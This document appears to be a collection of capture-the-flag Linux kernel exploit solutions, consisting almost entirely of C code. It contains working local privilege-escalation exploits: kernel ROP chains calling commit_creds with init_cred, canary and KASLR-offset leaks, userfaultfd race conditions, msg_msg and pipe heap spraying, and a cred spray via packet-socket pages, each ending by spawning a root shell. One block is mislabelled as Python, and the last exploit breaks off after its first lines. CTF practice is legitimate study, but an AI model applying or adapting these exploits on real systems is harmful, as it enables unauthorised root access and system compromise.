    read(dev_fd, buf, 240);
    kernel_offset = buf[0] - 0xffffffff81b2d8f7;
    printf("leak_kernel_offset_is %lx\n", kernel_offset);

    int i = 0;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = canary;
    rop[i++] = 0;
    rop[i++] = get_root;
    rop[i++] = swapgs_pop_rbp_ret + kernel_offset;
    rop[i++] = 0;
    rop[i++] = iretq + kernel_offset;
    rop[i++] = get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(dev_fd, rop, 0x100);
    ioctl(dev_fd, 0);
}
```





##### 星盟 Kernel pwn2

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>
#include <pthread.h>

size_t commit_creds = 0xffffffff810b91e0;
size_t prepare_kernel_cred = 0xffffffff810b9550;
size_t init_cred = 0xffffffff8265b400;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00a34;
size_t secondary_startup_64 = 0xffffffff81000030;
size_t modprobe_path = 0xffffffff8265bce0;
size_t kernel_offset;

size_t pop_rdi_ret = 0xffffffff810835c0;
size_t push_rax_pop_rdi_ret = 0xffffffff821c6ec3;
size_t swapgs_pop_rbp_ret = 0xffffffff8106c984;
size_t iretq = 0xffffffff81e08960;

int dev_fd;
size_t buf[0x40];
pthread_t competetion_thread1;
pthread_t competetion_thread2;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}

void *competetion(){
    write(dev_fd, buf, 0x80);
}

int main(){
    save_status();
    dev_fd = open("/dev/test2", 2);
    if(dev_fd < 0){
        puts("Failed to open dev!");
    }

    write(dev_fd, buf, 0x80);
    pthread_create(&competetion_thread1, NULL, competetion, NULL);
    pthread_create(&competetion_thread2, NULL, competetion, NULL);
    sleep(1);
    read(dev_fd, buf, 0x80);
    pthread_cancel(competetion_thread1);
    pthread_cancel(competetion_thread2);

    size_t canary = buf[0x20];
    printf("leak_canary_is 0x%lx\n", canary);
    kernel_offset = buf[0x2f] - 0xffffffff81426939;
    printf("leak_kernel_offset 0x%lx\n", kernel_offset);

    int i = 0x20;
    buf[i++] = canary;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = pop_rdi_ret + kernel_offset;
    buf[i++] = init_cred + kernel_offset;
    buf[i++] = commit_creds + kernel_offset;
    buf[i++] = swapgs_restore_regs_and_return_to_usermode + 22 + kernel_offset;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = (size_t)get_shell;
    buf[i++] = user_cs;
    buf[i++] = user_rflags;
    buf[i++] = user_sp;
    buf[i++] = user_ss;

    pthread_create(&competetion_thread1, NULL, competetion, NULL);
    sleep(1);
    write(dev_fd, &buf[0x10], 0x100);

    read(dev_fd, buf, 0x180);
}
```



##### nctf babyyLinkedList

```python
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <string.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>

size_t commit_creds = 0xffffffff810c3d30;
size_t prepare_kernel_cred = 0xffffffff810c40b0;
size_t init_cred = 0xffffffff82a5fa40;
size_t modprobe_path = 0xffffffff82a60300;
size_t secondary_startup_64 = 0xffffffff81000030;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00a34;
size_t kernel_offset;

size_t pop_rdi_ret = 0xffffffff81086aa0;
size_t add_0x148_ret = 0xffffffff8188fba1;
size_t pop_rsi_ret = 0xffffffff8117da6e;

int proc_fd;
char *leak_buf, *write_buf, *sleep_buf, *hijack_buf;
sem_t sem_delete;
int seq_fd;

struct babylink
{
    size_t size;
    char *ptr;
};



size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void err_exit(char * msg)
{
    printf("[x] Error at: %s\n", msg);
    exit(EXIT_FAILURE);
}

void add(size_t size, char *ptr){
    struct babylink a = {size, ptr};
    ioctl(proc_fd, 0x6666, &a);
}

void delete(char *ptr){
    struct babylink a = {0, ptr};
    ioctl(proc_fd, 0x7777, &a);
}

void copy_to_kernel(char *ptr){
    struct babylink a = {0, ptr};
    ioctl(proc_fd, 0x8888, &a);
}

void copy_from_kernel(char *ptr){
    struct babylink a = {0, ptr};
    ioctl(proc_fd, 0x9999, &a);
}


//static pthread_t monitor_thread;
void register_userfaultfd(void * addr, unsigned long len, void *handler)
{
    pthread_t monitor_thread;
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        err_exit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        err_exit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        err_exit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        err_exit("pthread_create");
}

char temp_page_for_stuck[0x1000];


void set_seq(){
    seq_fd = open("/proc/self/stat", 0);
    if(seq_fd < 0){
        printf("Failed to open!\n");
        exit(-1);
    }
    
}

void *delete1(){
    sem_wait(&sem_delete);
    delete(sleep_buf);
}

void *leak_addr_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));
        pthread_t delete_thread;
        pthread_create(&delete_thread, 0, delete1, 0);
        sem_post(&sem_delete);
        sleep(1);
        set_seq();

        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

void *sleep_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));
        sleep(0x10000);
        
        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}


void hijack(){
    pop_rdi_ret += kernel_offset;
    pop_rsi_ret += kernel_offset;
    swapgs_restore_regs_and_return_to_usermode += kernel_offset + 16;
    init_cred += kernel_offset;
    commit_creds += kernel_offset;

    __asm__(
    "mov r15, 0xbeefdead;"
    "mov r14, 0x11111111;"
    "mov r13, 0x22222222;"
    "mov r12, pop_rdi_ret;"
    "mov rbp, init_cred;"
    "mov rbx, pop_rsi_ret;"
    "mov r11, 0;"
    "mov r10, commit_creds;"
    "mov r9,  swapgs_restore_regs_and_return_to_usermode;"
    "mov r8,  0x99999999;"
    "xor rax, rax;"
    "mov rcx, 0xaaaaaaaa;"
    "mov rdx, 8;"
    "mov rsi, rsp;"
    "mov rdi, seq_fd;"
    "syscall"
    );

    get_shell();

}

void *hijack_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));
        
        hijack();
        
        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}


char buf[0x20];

int main(){

    save_status();
    bind_core(0);

    proc_fd = open("/proc/babyLinkedList", O_RDWR);
    if (proc_fd < 0){
        err_exit("Failed to open proc!");
    }
    sem_init(&sem_delete, 0, 0);


    leak_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(leak_buf, 0x1000, leak_addr_thread);

    sleep_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(sleep_buf, 0x1000, sleep_thread);

    hijack_buf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd((hijack_buf + 0x1000), 0x1000, hijack_thread);
    
 
    add(0x20, leak_buf);
    delete(buf);

    kernel_offset = ((size_t*)buf)[0] - 0xffffffff812f2db0;
    printf("leak_kernel_offset_is %lx\n", kernel_offset);

    // write_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    // register_userfaultfd(write_buf, 0x1000, write_thread);
    
    //add(0x20, buf);
    

    *((size_t*)(hijack_buf + 0x1000 - 8)) = add_0x148_ret + kernel_offset;

    setxattr("/exp", "aaaaa", hijack_buf + 0x1000 - 8, 32, 0);


}
```



##### 2022西南半决cactus

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <signal.h>
#include <poll.h>
#include <stdint.h>
#include <semaphore.h>

size_t commit_creds = 0xffffffff810c9540;
size_t prepare_kernel_cred = 0xffffffff810c99d0;
size_t init_cred = 0xffffffff82a6b700;
size_t modprobe_path = 0xffffffff82a6c000;
size_t secondary_startup_64 = 0xffffffff81000040;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0;
size_t kernel_offset;

size_t pop_rdi_ret = 0xffffffff8108c420;
size_t pop_rdx_ret = 0xffffffff811cc80d;
size_t xchg_rdi_rax_ret = 0xffffffff8119a234 ; //xchg rdi, rax ; add dword ptr [rdx], eax ; xor eax, eax ; ret
size_t swapgs_ret = 0xffffffff81bc889f;
size_t iretq = 0xffffffff8103bb64;
size_t push_rsi_pop_rsp_add_rsp_0x18_ret = 0xffffffff81320385;

int dev_fd;
char *uffd_buf, *uffd_buf1;
int ms_qid;
char *buf;
int pipe_fd[2];
sem_t edit_sem;

struct edit_args
{
    size_t idx;
    size_t size;
    size_t buf;
};

struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void err_exit(char * msg)
{
    printf("[x] Error at: %s\n", msg);
    exit(EXIT_FAILURE);
}

void add(size_t idx, size_t size){
    struct edit_args a = {idx, size, 0};
    ioctl(dev_fd, 0x20, &a);
}

void edit(size_t idx, size_t size, size_t buf){
    struct edit_args a = {idx, size, buf};
    ioctl(dev_fd, 0x50, &a);
}

void delete(size_t idx){
    struct edit_args a = {idx, 0, 0};
    ioctl(dev_fd, 0x30, &a);
}

void uaf(){
    delete(0);
    ms_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(ms_qid < 0){
        err_exit("msgget");
    }
    
    memcpy(buf, "aaaaaaaa", 8);
    if(msgsnd(ms_qid, buf, 0x400 - 0x30, 0) < 0){
            err_exit("msgsnd");
    }

    memcpy(buf, "bbbbbbbb", 8);
    if(msgsnd(ms_qid, buf, 0x400 - 0x30, 0) < 0){
            err_exit("msgsnd");
    }
    
    if (pipe(pipe_fd) < 0)
        err_exit("failed to create pipe!");
        
    if (write(pipe_fd[1], "aaaaaaaa", 8) < 0)
        err_exit("failed to write the pipe!");
    
}

void uaf1(){
    delete(0);
    if (pipe(pipe_fd) < 0)
        err_exit("failed to create pipe!");
        
    if (write(pipe_fd[1], "aaaaaaaa", 8) < 0)
        err_exit("failed to write the pipe!");
}

static pthread_t monitor_thread;
void register_userfaultfd(pthread_t *monitor_thread, void * addr, unsigned long len, void (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        err_exit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        err_exit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        err_exit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        err_exit("pthread_create");
}

char temp_page_for_stuck[0x1000];
void *uffd_handler_for_stucking_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        //sleep(100000000);
        //delete(0);
        uaf();
        //sem_wait(&edit_sem);

        ((size_t*)(temp_page_for_stuck))[3] = 0x1000 - 0x30;
        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

void *uffd_handler_for_stucking_thread1(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        //sleep(100000000);
        uaf1();

        memcpy(temp_page_for_stuck, buf, 0x400);
        
        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}


int main(){
    pthread_t uffd_monitor_thread, uffd_monitor_thread1;
    save_status();
    bind_core(0);
    sem_init(&edit_sem, 0 ,0);

    dev_fd = open("/dev/kernelpwn", O_RDWR);
    if(dev_fd < 0){
        err_exit("Failed to open dev!");
    }

    buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    uffd_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(&uffd_monitor_thread, uffd_buf, 0x1000, uffd_handler_for_stucking_thread);
    
    add(0, buf);
    edit(0, 0x400, uffd_buf);
    //pthread_create(&edit_uaf_thread, 0, uaf, 0);
    //

    
    if(msgrcv(ms_qid, buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY) < 0){
        err_exit("msgrcv");
    }

    size_t msg_addr = *((size_t*)(buf + 0x410 - 0x30));
    printf("msg_addr_is %lx\n", msg_addr);

    size_t leak_kernel_addr = *((size_t*)(buf + 0x818 - 0x30));
    printf("leak_kernel_addr_is %lx\n", leak_kernel_addr);
    kernel_offset = leak_kernel_addr - 0xffffffff8203ed80;
    printf("kernel_offset_is %lx\n", kernel_offset);
    close(pipe_fd[1]);
    close(pipe_fd[0]);

    add(0, buf);
    uffd_buf1 = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(&uffd_monitor_thread1, uffd_buf1, 0x1000, uffd_handler_for_stucking_thread1);

    int i = 0;
    ((size_t*)buf)[i++] = 0;
    ((size_t*)buf)[i++] = push_rsi_pop_rsp_add_rsp_0x18_ret + kernel_offset;
    ((size_t*)buf)[i++] = msg_addr + 0x800;
    ((size_t*)buf)[i++] = pop_rdi_ret + kernel_offset;
    ((size_t*)buf)[i++] = init_cred + kernel_offset;
    ((size_t*)buf)[i++] = commit_creds + kernel_offset;
    ((size_t*)buf)[i++] = swapgs_restore_regs_and_return_to_usermode + 27 + kernel_offset;
    ((size_t*)buf)[i++] = 0;
    ((size_t*)buf)[i++] = 0;
    ((size_t*)buf)[i++] = (size_t)get_shell;
    ((size_t*)buf)[i++] = user_cs;
    ((size_t*)buf)[i++] = user_rflags;
    ((size_t*)buf)[i++] = user_sp;
    ((size_t*)buf)[i++] = user_ss;

    edit(0, 0x400, uffd_buf1);
    close(pipe_fd[1]);
    close(pipe_fd[0]);

    return 0;
}
```



##### corctf2022cache-of-castaways

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PGV_PAGE_NUM 1000
#define PGV_CRED_START (PGV_PAGE_NUM / 2)
#define CRED_SPRAY_NUM 514

#define PACKET_VERSION 10
#define PACKET_TX_RING 13

#define VUL_OBJ_NUM 400
#define VUL_OBJ_SIZE 512
#define VUL_OBJ_PER_SLUB 8
#define VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)

size_t commit_creds = 0xffffffff81066d20;
size_t prepare_kernel_cred = 0xffffffff81066ee0;
size_t init_cred = 0xffffffff81a50520;
size_t modprobe_path = 0xffffffff81a50de0;
size_t secondary_startup_64 = 0xffffffff81000040;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81400cb0;
size_t kernel_offset;

int dev_fd;
int cmd_pipe_req[2], cmd_pipe_reply[2], check_root_pipe[2];
char child_pipe_buf[1];
char buf[0x1000];
char bin_sh_str[] = "/bin/sh";
char *shell_args[] = { bin_sh_str, NULL };
char root_str[] = "\033[32m\033[1m[+] Successful to get the root.\n"
                  "\033[34m[*] Execve root shell now...\033[0m\n";


struct castaway_request {
    int64_t index;
    size_t	size;
    void 	*buf;
};

struct page_request {
    int idx;
    int cmd;
};

enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};


struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

struct timespec timer = {
    .tv_sec = 1145141919,
    .tv_nsec = 0,
};

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void alloc()
{
    ioctl(dev_fd, 0xCAFEBABE);
}

void edit(int64_t index, size_t size, void *buf)
{
    struct castaway_request r = {
        .index = index,
        .size = size,
        .buf = buf,
    };

    ioctl(dev_fd, 0xF00DBABE, &r);
}

int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}


//
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

int alloc_page(int idx){
    struct page_request req = {idx, CMD_ALLOC_PAGE};
    int ret;
    
    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

int free_page(int idx){
    struct page_request req = {idx, CMD_FREE_PAGE};
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}


int waiting_for_root_fn(void *args)
{

    __asm__ volatile (
        "   lea rax, [check_root_pipe]; "
        "   xor rdi, rdi; "
        "   mov edi, dword ptr [rax]; "
        "   mov rsi, child_pipe_buf; "
        "   mov rdx, 1;   "
        "   xor rax, rax; " /* read(check_root_pipe[0], child_pipe_buf, 1)*/
        "   syscall;      "
        "   mov rax, 102; " /* getuid() */
        "   syscall; "
        "   cmp rax, 0; "
        "   jne failed; "
        "   mov rdi, 1; "
        "   lea rsi, [root_str]; "
        "   mov rdx, 80; "
        "   mov rax, 1;"    /* write(1, root_str, 71) */
        "   syscall; "
        "   lea rdi, [bin_sh_str];  "
        "   lea rsi, [shell_args];  "
        "   xor rdx, rdx;   "
        "   mov rax, 59;    "
        "   syscall;        "   /* execve("/bin/sh", args, NULL) */
        "failed: "
        "   lea rdi, [timer]; "
        "   xor rsi, rsi; "
        "   mov rax, 35; "  /* nanosleep() */
        "   syscall; "
    );

    return 0;
}

__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    /* for syscall, it's clone(flags, stack, ...) */
    __asm__ volatile (
        " mov r15, rsi; "   /* save the rsi*/
        " xor rsi, rsi; "   /* set esp and useless args to NULL */
        " xor rdx, rdx; "
        " xor r10, r10; "
        " xor r8, r8;   "
        " xor r9, r9;   "
        " mov rax, 56;  "   /* __NR_clone */
        " syscall;      "
        " cmp rax, 0;   "
        " je child_fn;  "
        " ret;          "   /* parent */
        "child_fn:      "
        " jmp r15;      "   /* child */
    );
}

int main(){
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    dev_fd = open("/dev/castaway", O_RDWR);
    if(dev_fd < 0){
        err_exit("Failed to open dev");
    }

    pipe(cmd_pipe_reply);
    pipe(cmd_pipe_req);
    if(!fork()){
        struct page_request req;
        int socket_fd[1000];
        int ret;

        /* create an isolate namespace*/
        unshare_setup();

        /* handler request */
        do {
            read(cmd_pipe_req[0], &req, sizeof(req));

            if (req.cmd == CMD_ALLOC_PAGE) {
                ret = create_socket_and_alloc_pages(0x1000, 1);
                socket_fd[req.idx] = ret;
            } else if (req.cmd == CMD_FREE_PAGE) {
                ret = close(socket_fd[req.idx]);
            } else {
                printf("[x] invalid request: %d\n", req.cmd);
            }

            write(cmd_pipe_reply[1], &ret, sizeof(ret));
        } while (req.cmd != CMD_EXIT);
        exit(0);
    }

    for(int i = 0; i < 1000; ++i){
        if(alloc_page(i) < 0){
            printf("[x] failed at no.%d socket\n", i);
            err_exit("FAILED to spray pages via socket!");
        }
    }

    for(int i = 1; i < 1000; i += 2){
        free_page(i);
    }

    pipe(check_root_pipe);
    for (int i = 0; i < 514; i++) {
        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, 
                         waiting_for_root_fn) < 0){
            printf("[x] failed at cloning %d child\n", i);
            err_exit("FAILED to clone()!");
        }
    }

    for(int i = 0; i < 1000; i += 2){
        free_page(i);
    }

    memset(buf, '\0', 0x1000);
    *(uint32_t*) &buf[0x200 - 6] = 1;    /* cred->usage */
    for (int i = 0; i < 400; i++) {
        alloc();
        edit(i, 0x200, buf);
    }

    write(check_root_pipe[1], buf, CRED_SPRAY_NUM);
    sleep(1145141919);

    return 0;


}
```



##### 2023华北chatroom

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <string.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/msg.h>
#include <sys/mman.h>

size_t commit_creds = 0xffffffff810a3ca0;
size_t prepare_kernel_cred = 0xffffffff810a4090;
